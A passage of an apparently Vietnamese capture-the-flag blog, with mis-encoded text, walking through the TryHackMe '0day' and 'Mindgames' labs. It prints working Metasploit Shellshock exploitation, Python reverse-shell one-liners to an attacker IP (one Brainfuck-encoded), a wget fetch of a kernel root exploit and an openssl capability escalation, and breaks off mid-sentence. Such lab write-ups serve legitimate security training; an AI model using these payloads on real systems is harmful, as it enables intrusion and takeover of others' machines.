6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw== | 2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV | 256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E= | 256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: 0day Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Chá»‰ cÃ³ port 80 vá»›i web service lÃ  Ä‘Ã¡ng quan tÃ¢m hÆ¡n.\nSau khi thá»­ qua vÃ i ká»¹ thuáº­t cÆ¡ báº£n vÃ  khÃ´ng cÃ³ káº¿t quáº£, tÃ´i thá»­ tÃ¬m path cá»§a web nÃ y\n[12:34:40] 301 - 313B - /admin -\u0026gt; http://10.10.236.120/admin/ [12:34:41] 200 - 0B - /admin/ [12:34:41] 200 - 0B - /admin/?/login [12:34:41] 403 - 295B - /admin/.htaccess [12:34:42] 200 - 0B - /admin/index.html [12:34:56] 301 - 314B - /backup -\u0026gt; http://10.10.236.120/backup/ [12:34:56] 200 - 2KB - /backup/ [12:35:00] 301 - 315B - /cgi-bin -\u0026gt; http://10.10.236.120/cgi-bin/ [12:35:00] 403 - 288B - /cgi-bin/ [12:35:00] 200 - 13B - /cgi-bin/test.cgi [12:35:05] 301 - 311B - /css -\u0026gt; http://10.10.236.120/css/ [12:35:18] 301 - 311B - /img -\u0026gt; http://10.10.236.120/img/ [12:35:19] 200 - 3KB - /index.html [12:35:21] 200 - 928B - /js/ [12:35:42] 200 - 38B - /robots.txt [12:35:43] 200 - 109B - /secret/ [12:35:43] 301 - 314B - /secret -\u0026gt; http://10.10.236.120/secret/ CÃ³ 1 path lÃ m tÃ´i quan tÃ¢m lÃ  /cgi-bin/test.cgi. Khi thá»­ vÃ o path nÃ y tÃ´i Ä‘Æ°á»£c Hello World. ÄÃ¢y lÃ  má»™t lá»— há»•ng mang tÃªn shellshock. TÃ´i sáº½ thá»­ dÃ¹ng nÃ³ Ä‘á»ƒ khai thÃ¡c\nRCE # â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# git clone https://github.com/erinzm/shellshocker.git â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# cd shellshocker â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/shellshocker] â””â”€# python shellshocker.py http://10.10.236.120/cgi-bin/test.cgi Testing http://10.10.236.120/cgi-bin/test.cgi with a standard payload using ShellShocker http://10.10.236.120/cgi-bin/test.cgi is exploitable Äiá»u nÃ y cÃ³ nghÄ©a lÃ  lá»— há»•ng nÃ y cÃ³ thá»ƒ khai thÃ¡c Ä‘Æ°á»£c. TÃ´i sáº½ dá»±a vÃ o HackTricks Ä‘á»ƒ láº¥y RCE\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/shellshocker] â””â”€# msfconsole -q msf6 \u0026gt; use multi/http/apache_mod_cgi_bash_env_exec msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt; show options Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec): Name Current Setting Required Description ---- --------------- -------- ----------- CMD_MAX_LENGTH 2048 yes CMD max line length CVE CVE-2014-6271 yes CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278) HEADER User-Agent yes HTTP header to use METHOD GET yes HTTP method to use Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPATH /bin yes Target PATH for binaries used by the CmdStager RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI yes Path to CGI script TIMEOUT 5 yes HTTP read response timeout (seconds) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http: Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. Payload options (linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.141.129 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Linux x86 View the full module info with the info, or info -d command. msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt; set rhosts 10.10.236.120 rhosts =\u0026gt; 10.10.236.120 msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt; set targeturi /cgi-bin/test.cgi targeturi =\u0026gt; /cgi-bin/test.cgi msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt; set lhost 10.8.105.194 lhost =\u0026gt; 10.8.105.194 msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt; run [*] Started reverse TCP handler on 10.8.105.194:4444 [*] Command Stager progress - 100.46% done (1097/1092 bytes) [*] Sending stage (1017704 bytes) to 10.10.236.120 [*] Meterpreter session 1 opened (10.8.105.194:4444 -\u0026gt; 10.10.236.120:51388) at 2023-07-27 12:48:35 -0400 meterpreter \u0026gt; RCE thÃ nh cÃ´ng. Sá»­ dá»¥ng payload Python3#2 cá»§a Reverse Shell Generator\nTáº¡o listener vá»›i port 9001\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 9001 Sao chÃ©p payload vÃ o meterpreter\nmeterpreter \u0026gt; shell Process 1070 created. Channel 1 created. python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.8.105.194\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Quay trá»Ÿ láº¡i listener\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 9001 listening on [any] 9001 ... connect to [10.8.105.194] from (UNKNOWN) [10.10.236.120] 55265 www-data@ubuntu:/usr/lib/cgi-bin$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@ubuntu:/usr/lib/cgi-bin$ www-data@ubuntu:/usr/lib/cgi-bin$ cd /home cd /home www-data@ubuntu:/home$ ls ls ryan www-data@ubuntu:/home$ ls ryan ls ryan user.txt www-data@ubuntu:/home$ cat ryan/user.txt cat ryan/user.txt THM{Sh3llSh0ck_r0ckz} www-data@ubuntu:/home$ Privilege escalation # Kiá»ƒm tra má»™t chÃºt vá» mÃ¡y nÃ y\nwww-data@ubuntu:/tmp$ uname -a uname -a Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux TÃ¬m kiáº¿m cÃ¡c lá»— há»•ng cÃ³ liÃªn quan Ä‘áº¿n phiÃªn báº£n OS nÃ y vÃ  tÃ´i tÃ¬m ra nÃ³ á»Ÿ exploit-db. Exploit nÃ y viáº¿t báº±ng C vÃ  sau Ä‘Ã³ biÃªn dá»‹ch ra file ELF. File nÃ y cÅ©ng Ä‘Ã£ Ä‘Æ°á»£c public á»Ÿ Ä‘Ã¢y\nTáº£i nÃ³ vá» vÃ  táº¡o http server Ä‘á»ƒ táº£i nÃ³ lÃªn mÃ¡y\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Downloads] â””â”€# python -m http.server 8888 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ... www-data@ubuntu:/tmp$ wget http://10.8.105.194:8888/ofs_32 wget http://10.8.105.194:8888/ofs_32 --2023-07-27 10:31:47-- http://10.8.105.194:8888/ofs_32 Connecting to 10.8.105.194:8888... connected. HTTP request sent, awaiting response... 200 OK Length: 746008 (729K) [application/octet-stream] Saving to: \u0026#39;ofs_32\u0026#39; 100%[======================================\u0026gt;] 746,008 625KB/s in 1.2s 2023-07-27 10:31:48 (625 KB/s) - \u0026#39;ofs_32\u0026#39; saved [746008/746008] Exploit\nwww-data@ubuntu:/tmp$ chmod +x ofs_32 chmod +x ofs_32 www-data@ubuntu:/tmp$ ./ofs_32 ./ofs_32 spawning threads mount #1 mount #2 child threads done /etc/ld.so.preload created creating shared library id # id uid=0(root) gid=0(root) groups=0(root),33(www-data) # cat /root/root.txt cat /root/root.txt THM{g00d_j0b_0day_is_Pleased} # ","date":"16 May 2022","externalUrl":null,"permalink":"/ctf/tryhackme/0day/","section":"Ctf","summary":"","title":"Tryhackme - 0day","type":"ctf"},{"content":"","date":"10 May 2022","externalUrl":null,"permalink":"/tags/brainfuck/","section":"Tags","summary":"","title":"Brainfuck","type":"tags"},{"content":"","date":"10 May 2022","externalUrl":null,"permalink":"/tags/capabilities/","section":"Tags","summary":"","title":"Capabilities","type":"tags"},{"content":"","date":"10 May 2022","externalUrl":null,"permalink":"/tags/openssl/","section":"Tags","summary":"","title":"Openssl","type":"tags"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | Mindgames\nReconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDffdMrJJJtZTQTz8P+ODWiDoe6uUYjfttKprNAGR1YLO6Y25sJ5JCAFeSfDlFzHGJXy5mMfV5fWIsdSxvlDOjtA4p+P/6Z2KoYuPoZkfhOBrSUZklOig4gF7LIakTFyni4YHlDddq0aFCgHSzmkvR7EYVl9qfxnxR0S79Q9fYh6NJUbZOwK1rEuHIAODlgZmuzcQH8sAAi1jbws4u2NtmLkp6mkacWedmkEBuh4YgcyQuh6jO+Qqu9bEpOWJnn+GTS3SRvGsTji+pPLGnmfcbIJioOG6Ia2NvO5H4cuSFLf4f10UhAC+hHy2AXNAxQxFCyHF0WVSKp42ekShpmDRpP | 256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNlJ1UQ0sZIFC3mf3DFBX0chZnabcufpCZ9sDb7q2zgiHsug61/aTEdedgB/tpQpLSdZi9asnzQB4k/vY37HsDo= | 256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrqeEIugx9liy4cT7tDMBE59C9PRlEs2KOizMlpDM8h 80/tcp open http syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Mindgames. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Truy cáº­p vÃ o port 80 vá»›i web service.\nWeb nÃ y cÃ³ sá»­ dá»¥ng má»™t loáº¡i máº­t mÃ£ lÃ  BrainFuck. Vá»›i 2 vÃ­ dá»¥ Ä‘Æ°á»£c Ä‘á» cáº­p trÃªn trang web, á»Ÿ vÃ­ dá»¥ sá»‘ 2 vá» dÃ£y sá»‘ Fibonacci\n--[-----\u0026gt;+\u0026lt;]\u0026gt;--.+.+.[---\u0026gt;+\u0026lt;]\u0026gt;--.+++[-\u0026gt;++\u0026lt;]\u0026gt;.[--\u0026gt;+\u0026lt;]\u0026gt;+++++.[---\u0026gt;++\u0026lt;]\u0026gt;--.++[++\u0026gt;---\u0026lt;]\u0026gt;+.-[--\u0026gt;+++\u0026lt;]\u0026gt;--.\u0026gt;++++++++++.[-\u0026gt;+++\u0026lt;]\u0026gt;++....-[---\u0026gt;++\u0026lt;]\u0026gt;-.---.[---\u0026gt;+\u0026lt;]\u0026gt;--.+[-----\u0026gt;+\u0026lt;]\u0026gt;+.-[-\u0026gt;+++++\u0026lt;]\u0026gt;-.--[-\u0026gt;++\u0026lt;]\u0026gt;.+.+[--\u0026gt;+\u0026lt;]\u0026gt;+.[--\u0026gt;+++\u0026lt;]\u0026gt;+.+++++++++.\u0026gt;++++++++++.[-\u0026gt;+++\u0026lt;]\u0026gt;++........---[-----\u0026gt;++\u0026lt;]\u0026gt;.-------------.[---\u0026gt;+\u0026lt;]\u0026gt;---.+.---.----.-[-\u0026gt;+++++\u0026lt;]\u0026gt;-.[--\u0026gt;+++\u0026lt;]\u0026gt;+.\u0026gt;++++++++++.[-\u0026gt;+++\u0026lt;]\u0026gt;++....---[-----\u0026gt;++\u0026lt;]\u0026gt;.-------------.[---\u0026gt;+\u0026lt;]\u0026gt;---.+.---.----.-[-\u0026gt;+++++\u0026lt;]\u0026gt;-.+++[-\u0026gt;++\u0026lt;]\u0026gt;.[--\u0026gt;+\u0026lt;]\u0026gt;+++++.[---\u0026gt;++\u0026lt;]\u0026gt;--.[-----\u0026gt;++\u0026lt;]\u0026gt;+.++++.--------.++.-[---\u0026gt;+++++\u0026lt;]\u0026gt;.[--\u0026gt;+\u0026lt;]\u0026gt;+++++.[---\u0026gt;++\u0026lt;]\u0026gt;--.[-----\u0026gt;++\u0026lt;]\u0026gt;+.+++++.---------.\u0026gt;++++++++++...[---\u0026gt;+++++\u0026lt;]\u0026gt;.+++++++++.+++.[--\u0026gt;+++++\u0026lt;]\u0026gt;+++.-[---\u0026gt;++\u0026lt;]\u0026gt;-.[---\u0026gt;+\u0026lt;]\u0026gt;---.-[---\u0026gt;++\u0026lt;]\u0026gt;-.+++++.-[-\u0026gt;+++++\u0026lt;]\u0026gt;-.---[-----\u0026gt;++\u0026lt;]\u0026gt;.+++[-\u0026gt;+++\u0026lt;]\u0026gt;++.+++++++++++++.-------.--.--[-\u0026gt;+++\u0026lt;]\u0026gt;-.+++++++++.-.-------.-[--\u0026gt;+++\u0026lt;]\u0026gt;--.\u0026gt;++++++++++.[-\u0026gt;+++\u0026lt;]\u0026gt;++....[--\u0026gt;+++++++\u0026lt;]\u0026gt;.++.---------.+++++.++++++.+[---\u0026gt;+\u0026lt;]\u0026gt;+.-----[-\u0026gt;++\u0026lt;]\u0026gt;.[--\u0026gt;+\u0026lt;]\u0026gt;+++++.-----[-\u0026gt;+++\u0026lt;]\u0026gt;.[-----\u0026gt;++\u0026lt;]\u0026gt;-..\u0026gt;++++++++++. Khi cháº¡y Ä‘oáº¡n mÃ£ nÃ y sáº½ ra dÃ£y sá»‘ Fibonacci\n1 1 2 3 5 8 13 21 34 55 Tuy nhiÃªn khi tÃ´i thá»­ decode Ä‘oáº¡n brainfuck trÃªn nÃ³ láº¡i lÃ  1 Ä‘oáº¡n code python\ndef F(n): if n \u0026lt;= 1: return 1 return F(n-1)+F(n-2) for i in range(10): print(F(i)) Äiá»u nÃ y cÃ³ nghÄ©a lÃ  backend cÃ³ thá»ƒ xá»­ lÃ½ Ä‘Æ°á»£c code python nháº­p vÃ o.\nRCE # Váº­y thÃ¬ tÃ´i sáº½ thá»­ táº¡o 1 python reverse shell\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.8.105.194\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;sh\u0026#34;) Tiáº¿p theo lÃ  convert nÃ³ sang brainfuck\n\u0026gt;++++++++++[\u0026lt;++++++++++\u0026gt;-]\u0026lt;+++++.++++.+++.-.+++.++.\u0026gt;+++++++++[\u0026lt;---------\u0026gt;-]\u0026lt;---.\u0026gt;+++++++++[\u0026lt;+++++++++\u0026gt;-]\u0026lt;++.----.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;---.++++++++.------.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;-.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;--------.\u0026gt;++++++++[\u0026lt;++++++++\u0026gt;-]\u0026lt;+++++++.++.\u0026gt;++++[\u0026lt;----\u0026gt;-]\u0026lt;---.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;--.++.---.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;---.++.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;--..\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;-------.\u0026gt;++++++++[\u0026lt;++++++++\u0026gt;-]\u0026lt;+++.++++.\u0026gt;+++++++[\u0026lt;-------\u0026gt;-]\u0026lt;-------.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;+++++++.\u0026gt;+++++++[\u0026lt;-------\u0026gt;-]\u0026lt;-----.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;+++++.----.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;---.++++++++.------.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;-.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;------.\u0026gt;++++++++[\u0026lt;++++++++\u0026gt;-]\u0026lt;+++++.----.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;---.++++++++.------.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;-.\u0026gt;+++++++++[\u0026lt;---------\u0026gt;-]\u0026lt;+++++.\u0026gt;+++++++++[\u0026lt;+++++++++\u0026gt;-]\u0026lt;------.----.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;---.++++++++.------.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;-.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;------.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;+++.+++++.\u0026gt;+++++[\u0026lt;+++++\u0026gt;-]\u0026lt;.\u0026gt;+++++[\u0026lt;-----\u0026gt;-]\u0026lt;+++.+++++.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;-.\u0026gt;++++++[\u0026lt;------\u0026gt;-]\u0026lt;----.\u0026gt;++++++++[\u0026lt;++++++++\u0026gt;-]\u0026lt;+++++++.----.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;---.++++++++.------.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;-.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;------.\u0026gt;++++++[\u0026lt;++++++\u0026gt;-]\u0026lt;+.----.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;---.++++++++.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;++++.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;---.+.--.\u0026gt;++++[\u0026lt;----\u0026gt;-]\u0026lt;+++.----.\u0026gt;+++[\u0026lt;+++\u0026gt;-]\u0026lt;+++.\u0026gt;++++++[\u0026lt;------\u0026gt;-]\u0026lt;.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;++.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;+++++++.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;-----.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;++++.\u0026gt;+++[\u0026lt;+++\u0026gt;-]\u0026lt;+++.-..\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;.--.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;+.\u0026gt;+++++++++[\u0026lt;---------\u0026gt;-]\u0026lt;+++++..------.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;-.-.--.\u0026gt;+++[\u0026lt;+++\u0026gt;-]\u0026lt;+.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;-.+++.-.+++++.-------.+++.++++++++.-----.\u0026gt;++++[\u0026lt;----\u0026gt;-]\u0026lt;--.\u0026gt;+++[\u0026lt;+++\u0026gt;-]\u0026lt;+.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;---.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;..+.--------..\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;++.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;+++.++++.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;-----.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;+++++.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;+.-----.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;++.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;-.\u0026gt;+++++++++[\u0026lt;+++++++++\u0026gt;-]\u0026lt;------.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;-----.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;+++++++.+++.+++.-------.\u0026gt;+++[\u0026lt;+++\u0026gt;-]\u0026lt;.+.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;-------.+.+++.++++.-------.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;++.\u0026gt;+++++[\u0026lt;-----\u0026gt;-]\u0026lt;--.\u0026gt;+++++++++[\u0026lt;+++++++++\u0026gt;-]\u0026lt;--.++++.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;-----.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;+++++.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;+.-----.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;++.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;-.\u0026gt;+++++++++[\u0026lt;+++++++++\u0026gt;-]\u0026lt;------.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;-----.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;+++++++.+++.+++.-------.\u0026gt;+++[\u0026lt;+++\u0026gt;-]\u0026lt;.+.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;-------.+.+++.+++++.--------.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;++.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;+++.++++.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;-----.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;+++++.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;+.-----.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;++.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;-.\u0026gt;+++++++++[\u0026lt;+++++++++\u0026gt;-]\u0026lt;------.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;-----.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;+++++++.+++.+++.-------.\u0026gt;+++[\u0026lt;+++\u0026gt;-]\u0026lt;.+.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;-------.+.+++.++++++.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;.\u0026gt;++++[\u0026lt;++++\u0026gt;-]\u0026lt;++.\u0026gt;+++++++[\u0026lt;+++++++\u0026gt;-]\u0026lt;---.++++.+++.-.+++.++.\u0026gt;+++++++++[\u0026lt;---------\u0026gt;-]\u0026lt;---.\u0026gt;+++++++++[\u0026lt;+++++++++\u0026gt;-]\u0026lt;-.++++.+++++.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;++.\u0026gt;+++++[\u0026lt;-----\u0026gt;-]\u0026lt;--.\u0026gt;+++++++++[\u0026lt;+++++++++\u0026gt;-]\u0026lt;-.++++.+++++.\u0026gt;+++++++++[\u0026lt;---------\u0026gt;-]\u0026lt;++++++.\u0026gt;++++++++[\u0026lt;++++++++\u0026gt;-]\u0026lt;+++++.---.\u0026gt;++++[\u0026lt;----\u0026gt;-]\u0026lt;+.\u0026gt;+++++[\u0026lt;+++++\u0026gt;-]\u0026lt;---.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;------.------.\u0026gt;+++++++++[\u0026lt;+++++++++\u0026gt;-]\u0026lt;.\u0026gt;+++[\u0026lt;---\u0026gt;-]\u0026lt;--.\u0026gt;++++++++[\u0026lt;--------\u0026gt;-]\u0026lt;------.+++++++. Tiáº¿p theo táº¡o listener vá»›i port 9001\nCopy Ä‘oáº¡n brainfuck trÃªn vÃ o input vÃ  Run it!\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 9001 listening on [any] 9001 ... connect to [10.8.105.194] from (UNKNOWN) [10.10.198.28] 47296 $ id id uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames) $ ÄÃ£ cÃ³ RCE, viá»‡c tiáº¿p theo lÃ  tÃ¬m user flag.\nMÃ¡y nÃ y cÃ³ 2 user lÃ  mindgames vÃ  tryhackme vÃ  user flag náº±m trong dir cá»§a user cÃ³ thá»ƒ truy cáº­p Ä‘Æ°á»£c lÃ  mindgames\nbash mindgames@mindgames:~$ cd /home cd /home mindgames@mindgames:/home$ ls ls mindgames tryhackme mindgames@mindgames:/home$ ls mindgames ls mindgames user.txt webserver mindgames@mindgames:/home$ cat mindgames/user.txt cat mindgames/user.txt thm{411f7d38247ff441ce4e134b459b6268} mindgames@mindgames:/home$ Privilege escalation # Sau khi thá»­ 1 vÃ i exploit cÆ¡ báº£n Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£ thÃ¬ tÃ´i quyáº¿t Ä‘á»‹nh upload linpeas lÃªn mÃ¡y Ä‘á»ƒ nÃ³ phÃ¢n tÃ­ch cho nhanh.\nSau khi quÃ©t xong, tÃ´i Ä‘á»ƒ Ã½ tháº¥y cÃ³ thá»ƒ khai thÃ¡c Ä‘Æ°á»£c Capabilities. Kiá»ƒm tra láº¡i\nmindgames@mindgames:~$ getcap / -r 2\u0026gt;/dev/null getcap / -r 2\u0026gt;/dev/null /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/openssl = cap_setuid+ep /home/mindgames/webserver/server = cap_net_bind_service+ep mindgames@mindgames:~$ TÃ´i sáº½ thá»­ khai thÃ¡c vá»›i openssl. TÃ¬m kiáº¿m nÃ³ táº¡i GTFObins\nopenssl req -engine ./lib.so TÃ¬m hiá»ƒu vá» Openssl má»™t lÃºc vÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c cÃ¡ch khai 